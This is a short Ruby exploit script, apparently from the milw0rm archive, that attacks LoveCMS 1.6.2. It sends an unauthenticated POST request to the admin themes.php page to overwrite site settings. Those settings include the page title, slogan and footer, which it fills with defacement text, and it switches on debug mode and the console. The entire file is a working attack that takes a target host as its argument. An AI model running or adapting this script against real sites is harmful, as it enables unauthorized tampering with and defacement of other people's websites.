#!/usr/bin/ruby
#
## Exploit by PoMdaPiMp!
## ---------------------
##   pomdapimp(at)gmail(dotcom)
##
##   LoveCMS Exploit Series
##   Episode 3: changing site settings ...
##
##   Description: Simply change the site settings !
##
##   Usage: ./LoveCMS_3_settings.rb <host>
##   Ex:    ./LoveCMS_2_themes.rb http://site.com/lovecms/
##
##   Tested on: lovecms_1.6.2_final (MacOS X, Xampp)
#

require 'net/http'
require 'uri'

@host = 'http://127.0.0.1/lovecms_1.6.2_final/lovecms/'
@post_vars = {}
@post_vars['submit'] = 1
@post_vars['pagetitle'] = 'P4g3T1t1le'
@post_vars['sitename'] = 'SiteN4me'
@post_vars['slogan'] = 'By PoMdaPiMp.'
@post_vars['footer'] = 'PoMdaPiMp was here.'
@post_vars['description'] = 'Ruby is a gift.'
@post_vars['keywords'] = 'PoMdaPiMp, hack'
@post_vars['encoding'] = 'utf-8'
@post_vars['tips'] = 'off'
@post_vars['console'] = 'on'
@post_vars['debugmode'] = 'on'
@post_vars['module'] = 2
@post_vars['love_root'] = ''
@post_vars['love_url'] = ''

@host = ARGV[0] if ARGV[0]
@host += @host[-1, 1].to_s != '/' ? '/' : ''

if @host
  # --
  puts " + LoveCMS Exploit Series. #3: Messing with settings."
  puts
  puts " : Attacking host: " + @host

  # --
  # Changing settings
  res = Net::HTTP.post_form(URI.parse(@host + 'system/admin/themes.php'),
                            @post_vars)
  puts " :: Values set."
  @post_vars.each do |k, v|
    puts "    " + k.to_s + " > " + v.to_s
  end

  # --
  puts
  puts " - Visit " + @host
end

# milw0rm.com [2008-08-06]
